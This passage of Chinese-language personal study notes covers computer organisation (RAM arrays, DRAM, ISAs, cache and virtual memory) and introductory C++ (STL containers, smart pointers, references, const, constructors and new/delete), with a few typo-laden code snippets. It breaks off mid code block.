<p>但是如果字数很多（比如我们的内存），因为每个字都有1位在一个RAM Slide，我们的用以共享读写的电路单元数量很多，我们的译码器会很复杂。我们用<strong>重合选择coincident selection</strong>解决这个问题。
比如下面这个8×2的电路被改装成了4×4的样子，我们用行选择器和列选择器共同来选择一个word。
<img src="Basic/Architecture/../images/1610010045341.png" alt="" /></p>
<h3 id="2-sram-ics-array-sram芯片阵列"><a class="header" href="#2-sram-ics-array-sram芯片阵列">2. SRAM ICs Array SRAM芯片阵列</a></h3>
<p>继续构造更大的RAM，我们用RAM芯片阵列。用RAM构造RAM。
RAM抽象如下，$Address = log_2(64*1024)$表示地址选择；CS=0表示芯片不被选中，输出是高阻态。如果CS=1，输出选中的8位数据。
<img src="Basic/Architecture/../images/1610010786208.png" alt="" />
这样我们可以用4个64×8的RAM构成一个256×8的RAM，我们也可以改变word的长度，把地址线分开就好了。
<img src="Basic/Architecture/../images/1610011273716.png" alt="" /></p>
<h3 id="3-dram"><a class="header" href="#3-dram">3. DRAM</a></h3>
<p>DRAM和SRAM在上面的概念上有点类似。不过DRAM的存储单元不一样，而且还要考虑刷新的问题。
这是DRAM cell的模型和逻辑模型：
<img src="Basic/Architecture/../images/1610019604190.png" alt="" />
刷新一共有两种办法，可以每隔一段时间集中式刷新，也可以把全部的刷新分散在一段时间内进行。</p>
<!-- 不得不说，我不知道老师讲了什么东西 --><div style="break-before: page; page-break-before: always;"></div><h1 id="计算机组成计算机体系结构"><a class="header" href="#计算机组成计算机体系结构">计算机组成&amp;计算机体系结构</a></h1>
<h2 id="基础alu"><a class="header" href="#基础alu">基础ALU</a></h2>
<h3 id="加法器"><a class="header" href="#加法器">加法器</a></h3>
<h3 id="乘法器"><a class="header" href="#乘法器">乘法器</a></h3>
<h3 id="浮点运算"><a class="header" href="#浮点运算">浮点运算</a></h3>
<h2 id="architecture-1"><a class="header" href="#architecture-1">Architecture</a></h2>
<p>Term <strong>instruction set architecture (ISA)</strong> to refer to the actual programmer-visible instruction.</p>
<p>我们常见的ISA有80x86，ARM，RISC-V，那么我们怎么对他们进行分类呢？</p>
<ol>
<li>
<p>Class of ISA:</p>
<div class="table-wrapper"><table><thead><tr><th>Class</th><th></th><th>Example</th></tr></thead><tbody>
<tr><td>load-store</td><td>操作数只能是寄存器，对内存的通过load/store进行</td><td>RISC-V, ARM</td></tr>
<tr><td>register-memory</td><td>操作数可以是寄存器也可以是内存</td><td>80x86</td></tr>
<tr><td>stack</td><td>操作数在栈顶取，没有寄存器这么一说</td><td>Python虚拟机</td></tr>
<tr><td></td><td></td><td></td></tr>
</tbody></table>
</div></li>
<li>
<p>Memory Addressing: 几乎所有的架构都是以字节为单位进行寻址，有些架构要求对齐。</p>
</li>
<li>
<p>Addressing modes:</p>
<div class="table-wrapper"><table><thead><tr><th>Arch</th><th>Addressing modes</th></tr></thead><tbody>
<tr><td>RISC-V</td><td>Register, Immediate (for constants), and Displacement(reg+imm)</td></tr>
<tr><td>80x86</td><td>除了上面三种，还有Absolute,  two registers (based indexed with displacement),two registers  (based with scaled index and displacement)</td></tr>
</tbody></table>
</div></li>
<li>
<p>Types and sizes of operands: 通常都支持 8-bits,16-bit,32-bit,64-bit。</p>
</li>
<li>
<p>Operations: </p>
</li>
<li>
<p>Control flow instructions: 几乎所有架构的都支持conditional branches, unconditional jumps, procedure calls and returns.</p>
</li>
<li>
<p>Encoding: 如何编码</p>
</li>
</ol>
<p>Architecture 不只是 ISA，还有microarchitecture和hardware这些具体的实现方面。</p>
<h2 id="量化方法"><a class="header" href="#量化方法">量化方法</a></h2>
<p><img src="Basic/Architecture/../images/image-20211113112250620.png" alt="image-20211113112250620" /></p>
<p>clock cycles per instruction (CPI)</p>
<p><img src="Basic/Architecture/../images/image-20211113112317156.png" alt="image-20211113112317156" /></p>
<p>Average memory access time</p>
<p><img src="Basic/Architecture/../images/image-20211113113759732.png" alt="image-20211113113759732" /></p>
<h2 id="设计原则"><a class="header" href="#设计原则">设计原则</a></h2>
<ol>
<li>Design for Moore’s Law</li>
<li>Use Abstraction to Simplify Design</li>
<li>Make the Common Case Fast</li>
<li>Performance via Parallelism</li>
<li>Performance via Pipelining</li>
<li>Performance via Prediction</li>
<li>Hierarchy of Memories</li>
<li>Dependability via Redundancy</li>
</ol>
<hr />
<h2 id="单周期cpu-1"><a class="header" href="#单周期cpu-1">单周期CPU</a></h2>
<h2 id="流水线"><a class="header" href="#流水线">流水线</a></h2>
<h2 id="内存"><a class="header" href="#内存">内存</a></h2>
<p>一个理想的内存，是容量无限，没有延迟的。我们当然不可能做到理想内存，但是我们可以根据局部性原理，用层次化存储模型去接近理想内存。曾经我们想让内存有着更快的速度，但是现在能耗也是很大的问题。</p>
<p><img src="Basic/Architecture/../images/image-20211113113709200.png" alt="image-20211113113709200" /></p>
<h3 id="cache-1"><a class="header" href="#cache-1">Cache</a></h3>
<p>关于cache如何工作，主要有4个问题要回答</p>
<ol>
<li>
<p>Where Can a Block be Placed in a Cache?(Block Replacement)</p>
<ol>
<li>Direct mapped</li>
<li>Fully associative</li>
<li>X-way Set-associative</li>
</ol>
</li>
<li>
<p>How is a block found if it is in the upper level/main memory ?(Block Identification)</p>
<p>Every block has an address tag that stores the main memory address of the data stored in the block. Often, each cache block also has a valid bit that tells if the contents of the cache block are valid</p>
<p><img src="Basic/Architecture/../images/image-20211113120041764.png" alt="image-20211113120041764" /></p>
</li>
<li>
<p>Which block should be replaced on a (Virtual Memory) miss?</p>
<p>LRU, FIFO, 还有一个不现实的OPT。</p>
<p>stack replacement algorighm保证随着cache大小的增加miss次数不会增加</p>
</li>
<li>
<p>What happens on a write? (Write Strategy)</p>
<ol>
<li>If the data is written to memory, the cache is called a <strong>write-through</strong> cache
<ul>
<li>Can always discard cached data most up-to-date data is in memory</li>
<li>Cache control bit: only a valid bit</li>
<li>memory (or other processors) always have latest data</li>
</ul>
</li>
<li>If the data is NOT written to memory, the cache is called a <strong>write-back</strong> cache.
<ul>
<li>Can’t just discard cached data - may have to write it back to memory</li>
<li>Cache control bits: both valid and dirty bits</li>
<li>much lower bandwidth, since data often overwritten multiple times</li>
</ul>
</li>
<li>If a miss occurs on a write (the block is not present), there are two options.
<ul>
<li>Write allocate: The block is loaded into the cache on a miss before anything else occurs. </li>
<li>Write around (no write allocate): The block is only written to main memory </li>
</ul>
</li>
</ol>
</li>
</ol>
<p>如何评价Cache的表现？</p>
<ul>
<li>$CPUTime=(CPUExecutionClockCycles+MemoryStallClockCycles)\times ClockCycleTime$</li>
<li>$AverageMemoryAccessTime = HitTime+MissRate \times MissPenalty$。对于数据Cache和指令Cache分开的体系，我们需要分开考虑。</li>
</ul>
<h3 id="virtual-memory-1"><a class="header" href="#virtual-memory-1">Virtual Memory</a></h3>
<p>操作系统学习的页表机制就是Virtual Memory的一个很好的例子，这里简单的介绍一下。主存是硬盘的cache。</p>
<ol>
<li>
<p>Where can a block be placed in main memory?</p>
<p>因为极高的miss penalty，所以采用了Fully associative strategy，OS允许virtual page映射到任何physical frame。</p>
</li>
<li>
<p>How is a block found if it is in main memory?</p>
<p>页表机制</p>
</li>
<li>
<p>Which block should be replaced on a virtual memory miss?</p>
<p>通常使用LRU</p>
</li>
<li>
<p>What happens on a write?</p>
<p>同样因为极高的write penalty，write a block to disk only if it has been altered since being read from the disk;所以我们需要dirty bit。</p>
</li>
</ol>
<p>全相联的查询需要遍历页表，页表的缓存是TLB。我们知道一个进程有一个页表，意味着相同的Virtual Address可能映射到不同的物理地址。所以切换进程的时候需要手动的清空TLB。</p>
<p><img src="Basic/Architecture/../images/image-20211113144001108.png" alt="image-20211113144001108" /></p>
<h3 id="summary"><a class="header" href="#summary">Summary</a></h3>
<p>看一个示例。</p>
<p><img src="Basic/Architecture/../images/image-20211113144253181.png" alt="image-20211113144253181" /></p>
<h2 id="乱序执行"><a class="header" href="#乱序执行">乱序执行</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cc"><a class="header" href="#cc">C/C++</a></h1>
<p>虽然我觉得我还是“精通”C语言的，毕竟C语言内容不多。不过这里的笔记都是初学的时候记得，质量不高。</p>
<p>不过在看了Linux内核的代码之后，不得不感慨他们把C语言用的花里胡哨的。</p>
<p>我的C++水平仅限于课程的内容，《面向对象基础》，然后对他的内存布局稍微有一点熟悉，只能说是非常不擅长C++。所以这里的笔记自然也只对你应付《面向对象基础》的考核有所帮助。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="c_标准库"><a class="header" href="#c_标准库">C++_标准库</a></h1>
<h2 id="vector"><a class="header" href="#vector">Vector</a></h2>
<p><code>#include &lt;vector&gt;</code></p>
<p>这个是一个很好用的容器。有一点像Python里的list。一个可以变长的数组。但是不足的地方在于，<strong>他不会对里面的元素进行内存管理，你需要自己负责里面元素的生命周期。让他在vector存在的时候有效，还要适时销毁</strong>。
<img src="Basic/C/../images/1615871068412.jpg" alt="" /></p>
<pre><code class="language-cpp">template&lt;typename T&gt;
class Vector {
T∗ elem; // pointer to first element
T∗ space; // pointer to first unused (and uninitialized) slot
T∗ last; // pointer to last slot
public:
// ...
int size(); // number of elements (space-elem)
int capacity(); // number of slots available for elements (last-elem)
// ...
void reserve(int newsz); // increase capacity() to newsz
// ...
void push_back(const T&amp; t); // copy t into Vector
void push_back(T&amp;&amp; t); // move t into Vector
};
</code></pre>
<h2 id="map"><a class="header" href="#map">Map</a></h2>
<p>字典<code>std::map</code> 是有序键值对容器，它的元素的键是唯一的。用比较函数 Compare 排序键。搜索、移除和插入操作拥有对数复杂度。 map 通常实现为红黑树
初始化：</p>
<pre><code class="language-cpp">    const std::map&lt;std::string,int&gt; dir = {
        {&quot;west&quot; , Room::west},
        {&quot;east&quot;, Room::east},
        {&quot;up&quot;, Room::up},
        {&quot;down&quot;, Room::down},
        {&quot;north&quot;, Room::north},
        {&quot;south&quot;, Room::south},
    };
</code></pre>
<p>元素访问：</p>
<pre><code class="language-cpp">// at 返回到拥有等于 key 的关键的元素被映射值的引用。若无这种元素，则抛出 std::out_of_range 类型异常。
// insert 可以防止更新数据保证插入
//重载了operator []
letter_counts['b'] = 42;  // 更新既存值
letter_counts['x'] = 9;  // 插入新值
</code></pre>
<h2 id="智能指针"><a class="header" href="#智能指针">智能指针</a></h2>
<p><code>include &lt;memory&gt;</code></p>
<p>注意下面的代码，如果你有一个裸new操作，意味着你必须要自己手动的delete。如果忘记了，就会造成内存泄漏。而且，如果在中间的代码产生了错误，那么就算你记得了也没用（好像也可以	finally）。：</p>
<pre><code class="language-cpp">std::string * pstr = new std::string(str);
...
detele ps;
</code></pre>
<p>为此，C++有智能指针来帮我们管理对象的生命周期。其中<code>auto_ptr</code>是C98的方案，现在已经被摒弃。<code>unique_ptr</code>和<code>shared_ptr</code>是C11引入的。智能指针的使用上和普通的指针基本一样。<code>shared_ptr</code>会进行引用计数，当计数为0时自动destruct。<code>unique_ptr</code>会建立ownership的概念，每一个对象只能有一个owner，负责生命周期的管理。</p>
<pre><code class="language-cpp">#include &lt;string&gt;
#include &lt;iostream&gt;
#include &lt;memory&gt;
using namespace std;

class Report
{
    public:
    Report(){cout &lt;&lt; &quot;Report()&quot; &lt;&lt; endl;}
    ~Report(){cout &lt;&lt; &quot;~Report()&quot; &lt;&lt; endl;}
    void report(){cout &lt;&lt; &quot;Report.report()&quot; &lt;&lt; endl;}
};

int main(){
    {
        std::auto_ptr&lt;Report&gt; ps(new Report());
        ps-&gt;report();
    }
    {
        std::unique_ptr&lt;Report&gt; ps(new Report());
        ps-&gt;report();
    }
    {
        std::shared_ptr&lt;Report&gt; ps(new Report());
        ps-&gt;report();
    }
}
</code></pre>
<h2 id="字符串"><a class="header" href="#字符串">字符串</a></h2>
<p>字符串的初始化：我们几乎可以和用<code>char[]</code>类似的方式使用<code>string</code>。事实上，string类有7种构造函数。</p>
<pre><code class="language-cpp">string a;
a = &quot;fafasfafa&quot;;		//可以用一个字面量初始化
a = (char *)t;			//也可以用一个字符数组/字符指针初始化
string b = string(20,'$');	//&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;
</code></pre>
<p>操作。注意到，string的长度是可变的，我们一般不用担心溢出的问题（当然，这意味着一点性能的代价；最大长度好象是unsigned int的范围）：</p>
<pre><code class="language-cpp">string a=&quot;123&quot;,b=&quot;456&quot;;
a += b;					//重载了+，拼接非常方便
a = b;					//可以相互赋值

str.find(const string&amp; str,size_type pos=0);	//寻找从pos开始的子串
str.substr(pos, n);		//截取s中从pos开始（包括0）的n个字符的子串，并返回
str.replace(pos, n, s1)    //用s1替换s中从pos开始（包括0）的n个字符的子串

</code></pre>
<p>IO。</p>
<pre><code class="language-cpp">//输入
std::getline(cin,str);		//从流中读取一行，换行符被忽略
cin &gt;&gt; str;					//读取一个单词，也就是说空白被忽略
std::getline(cin,str,'.');	//指定结尾的字符
//输出
cout &lt;&lt; str &lt;&lt; endl;		
</code></pre>
<h2 id="时间"><a class="header" href="#时间">时间</a></h2>
<p><img src="Basic/C/../images/ctime.png" alt="img" /></p>
<h2 id="heap"><a class="header" href="#heap">Heap</a></h2>
<p>heap是算法库algorithm中的。下面的min_heap其实是vector。</p>
<pre><code>make_heap(min_heap.begin(), min_heap.end(), compare);   //创建最小堆
pop_heap(minH.begin(), minH.end(), compare);                    // pop_heap不是真的pop出来，而是换到最后一个        
buf1 = *(minH.end() - 1);             // 最后一个元素
minH.pop_back();                        // 删除
minH.push_back(ptr);
push_heap (minH.begin(),minH.end(),compare);        
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="c-基础知识"><a class="header" href="#c-基础知识">C++ 基础知识</a></h1>
<p>C++是一个强大的语言，其中包含的很多程序设计的思想值得学习。请千万不要在程序里出现裸new，用智能指针包裹他们！</p>
<ul>
<li>C++语言基础   8学时
<ul>
<li>更好的C ✔️</li>
<li>const ✔️</li>
<li>引用 ✔️</li>
<li>函数原型</li>
<li>内联函数 ✔️</li>
<li>缺省自变量 ✔️</li>
<li>重载 ✔️</li>
<li>类和封装 ✔️</li>
<li>私有、保护和公共 ✔️</li>
<li>构造函数和析构函数 ✔️</li>
<li>友元 ✔️</li>
<li>类中的运算符和函数重载</li>
<li>派生 ✔️</li>
<li>虚函数和多态性 ✔️</li>
<li>流 ✔️</li>
</ul>
</li>
<li>第三部分 面向对象的软件开发  6学时
<ul>
<li>传统的软件开发方法</li>
<li>面向对象模型</li>
<li>面向对象设计与实现</li>
<li>典例实例剖析</li>
</ul>
</li>
<li>第四部分C++的高级论题   10学时
<ul>
<li>模板和异常处理</li>
<li>拷贝构造函数与参数传递</li>
<li>常量约束</li>
<li>虚析构函数</li>
<li>重载时参数匹配顺序</li>
<li>静态成员</li>
<li>临时对象的构造和撤消</li>
</ul>
</li>
</ul>
<h2 id="better-c"><a class="header" href="#better-c">Better C</a></h2>
<p>很久之前C++是C的超集，不过经过十几年的发展现在从C++已经不能完全兼容C了。</p>
<p>不过运算符那些东西和C都是一样的。</p>
<p>我们在C语言里一般用<code>stdio.h</code>，在C++用流<code>iostram</code></p>
<ul>
<li>文件输入流<code>ifstream</code></li>
<li>文件输出流 <code>ofstream</code></li>
<li>标准输入流 <code>cin</code></li>
<li>标准输出流 <code>cout</code></li>
</ul>
<pre><code class="language-cpp">#include &lt;iostream&gt;
#include &lt;fstream&gt;

using namespace std;

int main()
{
    ofstream FileA(&quot;./hello.txt&quot;);
    ifstream FileB(&quot;./CMakeLists.txt&quot;);
    string str=&quot;Hello world&quot;;
    FileA &lt;&lt; str &lt;&lt; endl;
    FileB &gt;&gt; str;
    cout &lt;&lt; &quot;Str= &quot; &lt;&lt; str &lt;&lt; endl;
    return 0;
}
</code></pre>
<p>我们在C语言里用的字符数组，在C++里多了一个选择——<code>string</code></p>
<p>除了和C语言一样的循环，C++11还有一种枚举循环。这个</p>
<pre><code class="language-cpp">#include &lt;iostream&gt;

int main()
{
    char s[]=&quot;hello world!&quot;;
    for (auto x:s)			//拷贝
    {
        std::cout &lt;&lt; x;
    }
    for (auto &amp;x:s)			//引用
    {
        std::cout &lt;&lt; x;
    }
}
</code></pre>
<h3 id="static"><a class="header" href="#static">static</a></h3>
<p>对于全局变量，局部变量，全局函数，和C语言是一样的。需要注意的是，函数的局部变量在语义上只会初始化一次，全局类的构造函数和析构函数也只会调用一次。至于具体是怎么实现的？</p>
<p>对于class的成员变量来说，Shared by all instance。静态成员的定义应该放在cpp文件中。静态成员变量不能在初始化列表中初始化，因为他不是普通的成员变量。不过也没有人会在这里初始化吧，直接在定义的地方初始化就好了。</p>
<p>类似的，如果data是private的话，外部也是不能访问的。令人迷惑的是，如果外部可以访问，（实例）<code>a.data</code>和（类）<code>A::data</code>都是合法的用法，但是显然第二个语义表达的更清楚。</p>
<p>对于class的方法来说，也是Shared by all instance，但是只能访问全局变量，因为参数中没有默认的self指针。</p>
<pre><code class="language-cpp">// Demo: 
// 静态的东西都是属于类而不是属于实例的，整个程序只有一份
class A
{
	static int k;	//静态变量需要在类中定义
public:
	static int get_k(){ 	//静态函数
        //静态函数是没有self的，所以里面使用的变量只能是静态变量，不能是类里面的变量
		return k;
	}
};
int A::k = 555;		//必须在*外部*显式的初始化

void main(){
    A a;
    cout &lt;&lt; a.get_k() &lt;&lt; endl;
    cout &lt;&lt; A::get_k() &lt;&lt; endl;
}
</code></pre>
<div class="table-wrapper"><table><thead><tr><th></th><th>static修饰</th><th>无static修饰</th></tr></thead><tbody>
<tr><td>方法</td><td>外部访问性受修饰符影响。 实际上全局也只有一个代码。没有默认的this指针，所以不能访问类变量。 可以用类或实例访问。</td><td>外部访问性受修饰符影响。 实际上全局也只有一个代码。其实第一个参数是隐含的this指针。 可以用实例访问。</td></tr>
<tr><td>变量</td><td>外部访问性受修饰符影响。 可以理解为在类命名空间下的静态变量（可以用类实例来访问他）；必须要在外面初始化。全局只有一个。 可以用类或实例访问。</td><td>外部访问性受修饰符影响。 每一个类的实例都有一个变量。 可以用实例访问。</td></tr>
</tbody></table>
</div>
<h2 id="reference"><a class="header" href="#reference">Reference</a></h2>
<p>引用是C语言里不存在的概念。
引用变量是一个<strong>别名</strong>，也就是说，它是某个已存在变量的另一个名字。一旦把引用初始化为某个变量，就可以使用该引用名称或变量名称来指向变量。
引用很容易与指针混淆，虽然他们在原理上有相似之处。在使用的时候，它们之间有三个主要的不同：</p>
<ul>
<li><strong>不存在空引用</strong>。引用必须连接到一块合法的内存。</li>
<li>一旦引用被初始化为一个对象，就不能被指向到另一个对象。指针可以在任何时候指向到另一个对象。</li>
<li>引用必须在创建时被初始化。指针可以在任何时间被初始化。</li>
<li>没有引用的引用。不可以有指针指向引用。不过指针可以有引用。</li>
</ul>
<p>例子，指针用<code>*</code>号，引用用<code>&amp;</code>号。</p>
<pre><code class="language-cpp">// 声明简单的变量  
int  i; 
double  d; 
// 声明引用变量  
int&amp; r = i; 
double&amp; s = d;
//常见用法
int&amp; inc(int&amp; x){
    x++;        //如果调用inc(var),那么var确实+1了。
    return x;  //引用类型是可以返回的，但是不要把局部变量返回了。
}
</code></pre>
<p>非常量引用的初始值必须为左值。其实可以用指针的角度去思考这个问题。为什么<code>const int&amp;</code>就可以了呢？因为他不是左值。</p>
<p>在实现上，其实编译器为<code>i*3</code>找了一个栈上的临时空间来存放他，<code>3</code>也是同理。仔细一想，这样也合乎逻辑。</p>
<pre><code class="language-cpp">int i;
int&amp; r1 = i;
int&amp; r2 = i*3;				//非法，i*3不是合法的左值。i*3的地址在哪里？
int$ r3 = 3;				//非法，3不是合法的左值。3的地址在哪里？
const int&amp; cr1 = i*3;		//合法，创建了一个临时空间
const int&amp; cr2 = 3;			//合法，创建了一个临时空间
</code></pre>
<p>引用的大小是固定的，和指针一样。所以很适合大对象的参数传递。他和指针在本质上差别不大，所以能用引用的地方大都能用指针，指针更加灵活。</p>
<h2 id="inline"><a class="header" href="#inline">Inline</a></h2>
<p>Inline Function是为了避免调用函数的额外开销，会“原地展开”</p>
<ul>
<li>inline使用限制：inline 的使用是有所限制的，inline 只适合涵数体内代码简单的涵数使用，不能包含复杂的结构控制语句例如 while、switch，并且不能内联函数本身不能是直接递归函数（即，自己内部还调用自己的函数）</li>
<li>inline仅是一个对编译器的建议：inline 函数仅仅是一个对编译器的建议，所以最后能否真正内联，看编译器的意思，它如果认为函数不复杂，能在调用点展开，就会真正内联，并不是说声明了内联就会内联，声明内联只是一个建议而已。</li>
<li>建议 inline 函数的<strong>定义放在头文件</strong>中：其次，因为内联函数要在调用点展开，所以编译器必须随处可见内联函数的定义，要不然就成了非内联函数的调用了。所以，这要求每个调用了内联函数的文件都出现了该内联函数的定义。内联函数是weak symbol，所以不会出现重复定义的问题。</li>
</ul>
<h2 id="const"><a class="header" href="#const">Const</a></h2>
<p>compile time constant 和 run-time constant
const：默认只能在当前的编译单元之间使用。因为编译器可能会把const直接替换成常数，所以我们通常把他放到头文件中，internal linkage才不会引起错误。
extern const可以跨越这个限制。</p>
<pre><code class="language-cpp">char * const q =&quot; abc&quot;;     //你不能用一个变量指针指向一个常量，比如下面的第一种情况。
int const *q = x;     //你不能修改q
const char * p = &quot;ABC&quot;;     //你不能通过p去修改指向的内容
char const * p = &quot;ABC&quot;;     //你不能通过p去修改指向的内容，和上面一样
</code></pre>
<p>传递对象但是不想改动他，可以：</p>
<ol>
<li>直接传值，但是对大结构不友好，浪费栈空间。</li>
<li>传指针，用const修饰</li>
<li>传引用，用const修饰（引用和指针一样大小）</li>
</ol>
<p>有时我们把我们的instance声明为const，不希望他的数据被修改。
但是在调用类方法的时候，我们怎么知道数据会不会被修改呢（因为我们在编译的时候，可能还不知道函数的具体实现，只有函数的声明.h文件，所以编译器无法帮我们检查）
我们可以通过把方法限定为const表示该函数不修改内部数据，能加上const的地方就加上const是好的编程习惯。不过const是会“传染”的，处理遗留代码会很麻烦。</p>
<ol>
<li>被const修饰的函数不能修改内部的数据。</li>
<li>被const修饰的函数不能调用非const修饰的函数。</li>
</ol>
<pre><code class="language-cpp">class A{
    public:
    void foo(){     //本质：void foo(A *this)
        cout &lt;&lt; &quot;foo&quot; &lt;&lt; endl;
    }
    void foo() const{    //本质：void foo(const A* this)，所以相当于一个函数的重载
        cout &lt;&lt; &quot;const foo&quot; &lt;&lt; endl;
    }   
}
</code></pre>
<p>const还可以用来修饰函数：</p>
<p>函数前const：普通函数或成员函数（非静态成员函数）前均可加const修饰，表示函数的返回值为const，不可修改。格式为：</p>
<pre><code>const returnType functionName(param list)
</code></pre>
<p>函数后加const：只有类的非静态成员函数后可以加const修饰，表示<strong>该类的this指针为const类型</strong>，不能改变类的成员变量的值，即成员变量为read only，任何改变成员变量的行为均为非法。此类型的函数可称为只读成员函数，格式为：</p>
<pre><code>returnType functionName(param list) const
</code></pre>
<h2 id="encapsulation-with-class-"><a class="header" href="#encapsulation-with-class-">Encapsulation with Class ⭐️</a></h2>
<p>C++的类，我觉得可以用struct来理解。class和struct差别不大（或者说在本质上是一样的）。不过Struct的所有东西都默认是Public的，Class里的所有东西默认是Private的。这个和Python是不同的。Python的object更像是一个指针或者说类的引用，指向真正的内容。而C++的类就是真正的内容，不过类里面可能有指针指向堆里的数据。
一个demo：</p>
<pre><code class="language-cpp">class Vector
{
    public:
        //这是类的构造函数
        //这个冒号的特性是使用初始化列表来初始化字段
        Vector(int s):elem(new double[s]), sz(s) 
        {

        }
        //重载了[]运算符
        double&amp; operator[](int i)
        {
            return elem[i];
        }
        //一个普通的接口
        int size()
        {
            return sz;
        }
    //私有变量
    private:
        double* elem;
        int sz;
};
int main()
{
    Vector arrow = Vector(2);
    arrow[1]=1;
    std::cout &lt;&lt; arrow.size() &lt;&lt; std::endl;
    std::cout &lt;&lt; arrow[0] &lt;&lt; std::endl;
    std::cout &lt;&lt; arrow[1] &lt;&lt; std::endl;
    return 0;
}
</code></pre>
<p>我们还没有提供一种机制来delete我们的elem。这个需要通过<strong>析构函数</strong>来完成。虽然会提供默认的析构函数，但是<strong>new和delete一定是成对出现的</strong>，自己new的东西肯定要自己delete。也没有错误处理。</p>
<p>我们的arrow变量是一个handler。一般来说，我们把变量作为private，把提供的接口作为Public。</p>
<p>我们在使用<code>a.size</code>的时候，其实编译器帮我们把arrow的地址作为指针当作第一个参数传了进去(this)，底层还是一个函数。换句话说，表面上是<code>int size()</code>，实际上是<code>int size(Vector *this)</code>。</p>
<p>每个instance的变量是各不相同的，但是函数是相同的。</p>
<h3 id="this"><a class="header" href="#this">this</a></h3>
<p>在 C++ 中，每一个对象都能通过 this 指针来访问自己的地址。<strong>this 指针是所有成员函数的隐含参数（第一个参数，在这一点上和Rust是类似的）</strong>。因此，在成员函数内部，它可以用来指向调用对象。
对于我们来说，this 形参是隐式定义的。实际上，任何自定义名为 this 的参数或变量的行为都是非法的。我们可以在成员函数体内部使用 this，因此尽管没有必要（如果局部变量、函数参数隐藏了类变量就有必要了）。</p>
<h2 id="constructordestructor"><a class="header" href="#constructordestructor">Constructor&amp;Destructor</a></h2>
<p>和内存存在着千丝万缕联系的函数，书写的时候要非常小心。如果里面有裸<code>new</code>和裸<code>delete</code>，建议把默认的函数全部禁止了：</p>
<ul>
<li>构造函数：对象会有一个默认的构造函数，是没有参数的。
<ul>
<li>C++有一个Initializer list的语法糖，帮我们简单的书写初始化。并且还有更多的好处，可以给const变量、引用赋初值，是工程的最佳实践。 <code>CExample(): a(0),b(8.8) { }</code>比如这是一个初始化函数，函数体为空。</li>
</ul>
</li>
<li>析构函数：当对象的生存周期结束的时候，对象的析构函数会被调用。编译器会帮你在后面插入析构函数。</li>
</ul>
<pre><code class="language-cpp">class X {
public:
    X(Sometype); 			//  ordinary constructor: create an object
    X();   			 		// default constructor
    X(const X&amp;);    		// copy constructor
    X(X&amp;&amp;);          		// move constructor
    X&amp; operator=(const X&amp;); // copy assignment: clean up target and copy
    X&amp; operator=(X&amp;&amp;); 		// move assignment: clean up target and move
    ˜X(); 					// destructor: clean up
</code></pre>
<p>There are five situations in which an object is copied or moved:</p>
<ul>
<li>As the source of an assignment</li>
<li>As an object initializer</li>
<li>As a function argument</li>
<li>As a function return value</li>
<li>As an exception</li>
</ul>
<pre><code class="language-cpp">// move语义是新标准的东西，我也不太懂
// 编译器默认的copy assignment是 bitwise的拷贝，和下面的行为是一致的，也就是说我其实可以不用写
#include &lt;iostream&gt;

using namespace std;
class X
{
public:
    int a;

    X(int _a): a(_a) {
        cout &lt;&lt; &quot;X()&quot; &lt;&lt; endl;
    };
    X(const X&amp; x) {
        cout &lt;&lt; &quot;X(const X&amp;)&quot; &lt;&lt; endl; 
        this-&gt;a = x.a; 
    };
    X&amp; operator=(const X&amp;){
        cout &lt;&lt; &quot;X&amp; operator=(const X&amp;)&quot; &lt;&lt; endl; 
        return *this;
    }
    ~X(){
        cout &lt;&lt; &quot;~X()&quot; &lt;&lt; endl;
    };
};


int main()
{
    X x(1),z(1);
    X y = x;	// copy constructor
    z = y;		// copy assignment
    cout &lt;&lt; x.a &lt;&lt; &quot; &quot; &lt;&lt; y.a &lt;&lt; &quot; &quot; &lt;&lt; z.a &lt;&lt; endl;
}
</code></pre>
<p><a href="https://stackoverflow.com/questions/19919434/assignment-of-objects-in-c">参考链接-深拷贝和浅拷贝</a>。类对象默认的copy是浅拷贝，对于一些简单的类，这是没有什么问题的。但是对于<strong>内部存在指针</strong>的类，问题就大了。如果内部有别的对象，通过组合的方式结合在一起，其实我们不用为此写一个copy constructor，默认的行为是正确的。
类对象的拷贝操作可以通过两个成员来定义<strong>拷贝构造函数( copy constructor )**与**拷贝赋值运算符( copy assìgnment )</strong>。
<code>Vector::Vector(const Vector&amp; a)</code> : copy constructor
<code>Vector&amp; Vector::operator=(const Vector&amp; a)</code> : copy assignment</p>
<p>把这两个函数重载成你需要的拷贝方法，比如deep copy。</p>
<p>你写了构造函数，不过其实编译器会扩展构造函数做更多的事情，顺序如下：</p>
<ol>
<li>所有的 virtual base class constructors 必须被调用，从左到右，从深到浅。并同时设置好 virtual base class 所需要使用的各种机制。</li>
<li>所有的上一层的 base class construcotrs 必须被调用，以 base classes 声明的顺序。使用 member initialization list 或者调用默认构造函数，同时如果 base class是多重继承下的非第 1 基类，还需要调整 this 指针。</li>
<li>如果 class object 有 vptr，它们必须被正确的设置。</li>
<li>初始化成员列表：使用 member initialization list 或者调用默认构造函数。</li>
<li>你自己写的构造函数内容。</li>
</ol>
<p>析构函数也是会被扩展。</p>
<ol>
<li>如果 object 内带有 vptr，那么首先重设相关的 vtable；</li>
<li>你自己写的destructor 函数本身现在会被执行， 也就是说 vptr 会在程序员的代码执行之前被重设。</li>
<li>以声明顺序的相反顺序调用 members 的析构函数。</li>
<li>如果有任何直接的（上一层）nonvirtual base classed 拥有 destructor，那么会以其声明顺序的相反顺序被调用。</li>
<li>如果有任何 virtual base classes 拥有 destructor，而当前讨论的这个 class 是最尾端的，那么它们会以其原来的构造顺序的相反顺序被调用。</li>
</ol>
<h2 id="newdelete"><a class="header" href="#newdelete">New&amp;Delete</a></h2>
<p><a href="https://blog.csdn.net/hazir/article/details/21413833">参考链接</a>
动态内存操作：C++提供了<code>new</code>和<code>delete</code>两个关键字。
new会开辟一块内存，delete会释放一块内存。
那难道和malloc和free一样吗？
如果new一个class，会调用类的<strong>构造函数constructor</strong>；如果delete一个class，会调用类的<strong>析构函数destructor</strong>。
更准确的说，new的时候先开辟一块内存，再调用constructor；delete的时候先调用类的destructor，再释放那块内存。
正确的编写destructor，是程序正确的关键。可能要关闭打开的文件，释放锁，释放过程中开辟的内存等工作。更关键的是，要记得delete。
在new的时候，会额外开辟一些空间存一些metadata，存储在真正数据的前面，解决下面注释中提到的问题。</p>
<pre><code class="language-c++">int main()
{
    int *pa = new int(101);
    int *parr = new int [10];
    int *pstr = new String[16];

